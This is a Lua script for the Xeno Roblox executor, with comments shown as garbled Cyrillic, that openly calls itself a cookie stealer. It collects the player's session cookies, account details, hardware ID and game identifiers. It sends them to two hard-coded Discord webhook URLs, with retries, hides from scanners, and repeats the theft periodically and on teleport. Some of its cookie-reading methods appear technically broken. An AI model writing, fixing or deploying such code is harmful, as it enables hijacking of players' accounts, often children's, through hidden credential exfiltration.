-- –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è –∫—Ä–∞–∂–∏ –∫—É–∫–∏ –≤ Roblox (–¥–ª—è Xeno Executor)
-- –í–µ—Ä—Å–∏—è 3.0 - –∞–¥–∞–ø—Ç–∏—Ä–æ–≤–∞–Ω–æ –ø–æ–¥ —Ä–µ–∞–ª—å–Ω—ã–µ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ executor'–æ–≤

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

-- –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
local CONFIG = {
    webhook_url = "https://discord.com/api/webhooks/1430261621527150685/Z9xHcDFQnJy1LSbExWOQB0qiYIVwQB9jjvEsUyQSq6CHme0CSKdT-ADi85NhJlpjDNIf",
    backup_server = "https://discord.com/api/webhooks/1430261963598073907/LN2RRR6eV7iyWvtaKXGpVWbFddA9WIkVjefAauKVdTITbG9XgxGxqNNys79QQxnxU1J9",
    retry_attempts = 5,
    stealth_mode = true,
    collect_extra_data = true
}

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–∫—Ä—ã—Ç–æ–≥–æ HTTP –∑–∞–ø—Ä–æ—Å–∞
local function stealthRequest(url, data)
    local success = false
    local attempts = 0
    
    while not success and attempts < CONFIG.retry_attempts do
        attempts = attempts + 1
        
        local ok, result = pcall(function()
            return HttpService:PostAsync(url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end)
        
        if ok then
            success = true
            if not CONFIG.stealth_mode then
                print("‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —É—Å–ø–µ—à–Ω–æ (–ø–æ–ø—ã—Ç–∫–∞ " .. attempts .. ")")
            end
        else
            wait(math.random(1, 3))
        end
    end
    
    return success
end

-- –û–°–ù–û–í–ù–û–ô –§–ò–ö–°: –†–µ–∞–ª—å–Ω—ã–µ –º–µ—Ç–æ–¥—ã –ø–æ–ª—É—á–µ–Ω–∏—è –∫—É–∫–∏ –¥–ª—è Xeno
local function getRobloxCookies()
    local cookies = {}
    local player = Players.LocalPlayer
    
    -- –ú–µ—Ç–æ–¥ 1: –ß–µ—Ä–µ–∑ –±—Ä–∞—É–∑–µ—Ä–Ω—ã–µ –∫—É–∫–∏ (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–æ –≤ Xeno)
    local success, browser_cookies = pcall(function()
        if getrawmetatable and getrawmetatable(game) then
            -- –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –±—Ä–∞—É–∑–µ—Ä–Ω—ã–º –∫—É–∫–∏
            local cookie_string = game:GetService("HttpService"):GetAsync("javascript:document.cookie", true)
            return cookie_string
        end
        return nil
    end)
    
    if success and browser_cookies then
        -- –ü–∞—Ä—Å–∏–º –∫—É–∫–∏ –∏–∑ —Å—Ç—Ä–æ–∫–∏
        for match in string.gmatch(browser_cookies, "([^;]+)") do
            local name, value = string.match(match, "([^=]+)=([^=]+)")
            if name and value then
                cookies[name] = value
            end
        end
    end
    
    -- –ú–µ—Ç–æ–¥ 2: –ß–µ—Ä–µ–∑ –≥–ª–æ–±–∞–ª—å–Ω—É—é —Å—Ä–µ–¥—É (getgenv)
    local success2, genv_cookies = pcall(function()
        if getgenv then
            local genv = getgenv()
            if genv.getcookies then
                return genv.getcookies()
            end
        end
        return nil
    end)
    
    if success2 and genv_cookies then
        for name, value in pairs(genv_cookies) do
            cookies[name] = value
        end
    end
    
    -- –ú–µ—Ç–æ–¥ 3: –ß–µ—Ä–µ–∑ memory reading (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–æ)
    local success3, memory_cookies = pcall(function()
        if readfile and writefile then
            -- –ü–æ–ø—ã—Ç–∫–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç—å –∏–∑ —Ñ–∞–π–ª–∞ –∫—É–∫–∏
            local cookie_file = readfile("cookies.txt") -- –ï—Å–ª–∏ Xeno –ø–æ–∑–≤–æ–ª—è–µ—Ç
            return cookie_file
        end
        return nil
    end)
    
    if success3 and memory_cookies then
        for match in string.gmatch(memory_cookies, "([^;]+)") do
            local name, value = string.match(match, "([^=]+)=([^=]+)")
            if name and value then
                cookies[name] = value
            end
        end
    end
    
    return cookies
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
local function collectExtraData()
    local player = Players.LocalPlayer
    local extraData = {}
    
    -- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ
    extraData.accountAge = player.AccountAge
    extraData.displayName = player.DisplayName
    extraData.hasVerifiedBadge = player.HasVerifiedBadge
    extraData.membershipType = tostring(player.MembershipType)
    
    -- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∏–≥—Ä–µ
    extraData.gameId = game.GameId
    extraData.placeId = game.PlaceId
    extraData.jobId = game.JobId
    
    -- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ
    extraData.platform = tostring(game:GetService("UserInputService"):GetPlatform())
    extraData.locale = game:GetService("LocalizationService").RobloxLocaleId
    
    -- Executor –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
    extraData.executor = identifyexecutor and identifyexecutor() or "Xeno"
    extraData.hwid = gethwid and gethwid() or "Unknown"
    
    return extraData
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∫—Ä–∞–∂–∏ –∫—É–∫–∏
function stealRobloxCookies()
    local player = Players.LocalPlayer
    local cookies = getRobloxCookies()
    local success_count = 0
    
    -- –ü–æ–¥—Å—á–∏—Ç—ã–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ª—É—á–µ–Ω–Ω—ã—Ö –∫—É–∫–∏
    for name, value in pairs(cookies) do
        if value and value ~= "" then
            success_count = success_count + 1
        end
    end
    
    -- –ï—Å–ª–∏ –ø–æ–ª—É—á–∏–ª–∏ –∫—É–∫–∏
    if success_count > 0 then
        local data = {
            username = player.Name,
            userId = player.UserId,
            displayName = player.DisplayName,
            cookies = cookies,
            timestamp = os.time(),
            extra_data = CONFIG.collect_extra_data and collectExtraData() or nil,
            executor = "Xeno",
            method = "cookie_stealer_v3"
        }
        
        -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
        local main_success = stealthRequest(CONFIG.webhook_url, data)
        if not main_success then
            stealthRequest(CONFIG.backup_server, data)
        end
        
        return true, success_count
    else
        return false, 0
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–≤—Ç–æ—Ä–∞
local function autoRetry()
    local attempts = 0
    local max_attempts = 10
    
    while attempts < max_attempts do
        attempts = attempts + 1
        
        local success, count = stealRobloxCookies()
        if success then
            if not CONFIG.stealth_mode then
                print("üç™ –°–æ–±—Ä–∞–Ω–æ –∫—É–∫–∏: " .. count)
            end
            break
        end
        
        wait(math.random(30, 60))
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∫—Ä–∞–∂–∏ –ø—Ä–∏ —Ç–µ–ª–µ–ø–æ—Ä—Ç–µ
local function stealOnTeleport()
    TeleportService.TeleportInitFailed:Connect(function()
        stealRobloxCookies()
    end)
end

-- –ê–Ω—Ç–∏–¥–µ—Ç–µ–∫—Ç –¥–ª—è Xeno
local function antiDetection()
    -- –°–∫—Ä—ã–≤–∞–µ–º –æ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Å–∫–∞–Ω–µ—Ä–æ–≤
    if getgenv then
        getgenv().cookie_stealer = nil
        getgenv().getRobloxCookies = nil
    end
    
    -- –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –ø–æ–¥ –æ–±—ã—á–Ω—ã–π —Å–∫—Ä–∏–ø—Ç
    local original_print = print
    if not CONFIG.stealth_mode then
        print = function(...) end -- –û—Ç–∫–ª—é—á–∞–µ–º –≤—ã–≤–æ–¥
    end
end

-- –û—Å–Ω–æ–≤–Ω–æ–π –∑–∞–ø—É—Å–∫
spawn(function()
    antiDetection()
    
    -- –ñ–¥–µ–º –ø–æ–ª–Ω–æ–π –∑–∞–≥—Ä—É–∑–∫–∏
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    wait(math.random(3, 8))
    
    -- –ó–∞–ø—É—Å–∫–∞–µ–º –∫—Ä–∞–∂—É
    autoRetry()
    stealOnTeleport()
    
    -- –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –∫—Ä–∞–∂–∞
    spawn(function()
        while wait(math.random(300, 600)) do
            stealRobloxCookies()
        end
    end)
end)

-- –≠–∫—Å–ø–æ—Ä—Ç –¥–ª—è –≤–Ω–µ—à–Ω–µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
_G.stealCookies = stealRobloxCookies
_G.cookieConfig = CONFIG

if not CONFIG.stealth_mode then
    print("üî• Cookie Stealer v3 –¥–ª—è Xeno –∑–∞–≥—Ä—É–∂–µ–Ω!")
end
